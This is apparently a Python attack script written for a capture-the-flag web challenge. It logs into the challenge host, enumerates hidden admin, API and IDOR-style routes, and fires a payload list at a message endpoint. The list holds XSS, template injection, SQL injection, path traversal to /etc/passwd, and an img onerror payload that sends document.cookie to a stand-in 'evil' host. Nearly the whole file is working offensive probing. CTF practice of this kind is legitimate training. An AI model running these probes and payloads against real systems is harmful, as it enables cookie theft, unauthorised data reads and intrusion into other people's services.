import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://c1dfcbb0-9c8a-478f-8b6b-bc87e9fbdc62.challenge.ctf.show"

s = requests.Session()
s.verify = False
s.post(f"{BASE}/login", data={"username": "test", "password": "test"}, allow_redirects=False)

# Test many more routes
routes = [
    # Flask template-related
    "/template", "/templates", "/render", "/jinja2", "/render_template",
    # Admin page variants
    "/admin_panel", "/adminpanel", "/admin-panel", "/administrator",
    "/admin_area", "/adminarea", "/admin_area/", "/panel/admin",
    # Message lookup
    "/message/1", "/message/0", "/msg/1", "/msg", "/messages/1",
    # API-style
    "/api/users", "/api/user", "/api/admin", "/api/flag", "/api/message",
    "/api/v1/users", "/api/v1/admin", "/api/v1/flag",
    # IDOR-style
    "/user/1", "/user/admin", "/user/0", "/users/1", "/profile/1",
    "/account/1", "/profile/admin",
    # Hidden
    "/status", "/health", "/healthcheck", "/version", "/version.txt",
    # More common
    "/login/", "/logout", "/login_post", "/login_post/",
    # Weird
    "/robots", "/humans.txt", "/security.txt",
    # Try with extensions
    "/index.html", "/home.html", "/admin.html", "/flag.html",
    # Try with Flask blueprints
    "/auth/login", "/auth/admin", "/auth/register",
    # Try with possible digit params
    "/?id=1", "/?user=admin", "/?page=admin", "/?role=admin",
    "/admin?name=admin", "/admin?user=admin",
]

print("=== Extended probe ===")
for route in routes:
    url = f"{BASE}{route}"
    try:
        r = s.get(url, allow_redirects=False)
        status = r.status_code
        loc = r.headers.get("Location", "")
        cl = len(r.content)
        is_404 = "Not Found" in r.text and r.status_code == 404
        if not (is_404) :
            print(f"  {route}: {status} len={cl} loc={loc.encode('utf-8')[:50]}")
            if status == 200 and len(r.text) > 0 and not is_404:
                print(f"    Body: {r.text[:200]}")
    except Exception as e:
        print(f"  {route}: ERROR {type(e).__name__}: {e}")

# Also try sending message with various payloads
print()
print("=== Message payload tests ===")
payloads = [
    ("test", "test"),
    ("<script>alert(1)</script>", "test"),
    ("{{7*7}}", "test"),
    ("${7*7}", "test"),
    ("<img src=x onerror=fetch('//evil/'+document.cookie)>", "test"),
    ("' UNION SELECT * FROM users--", "test"),
    ("../../../../etc/passwd", "test"),
    ("/flag", "test"),
    ("file:///etc/passwd", "test"),
    ("None", "test"),
    ("0", "test"),
]
for msg, sid in payloads:
    r = s.post(f"{BASE}/message", data={"msg": msg, "sessionid": sid}, allow_redirects=False)
    print(f"  msg={msg[:60]!r} sid={sid!r}: status={r.status_code} body={r.text.strip()[:50]}")